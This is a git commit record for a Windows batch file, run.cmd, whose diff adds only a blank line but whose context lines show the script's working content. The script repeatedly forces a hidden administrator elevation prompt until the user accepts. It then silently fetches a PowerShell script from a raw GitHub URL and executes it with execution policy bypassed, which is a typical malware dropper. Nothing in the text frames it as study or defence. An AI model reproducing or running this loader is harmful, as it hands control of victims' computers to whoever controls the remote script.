b23b0a8c1d19f5c1eaa3efbb218fa91be73a3c18
43a1723 <hai1723notgay@gmail.com>
2024-07-28 08:39:26 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -3,3 +3,4 @@ cd /d "%~dp0"
 net session >nul 2>&1
 if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
 powershell -w hidden -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/43a1723/test/main/download.ps1 | iex"
+ 
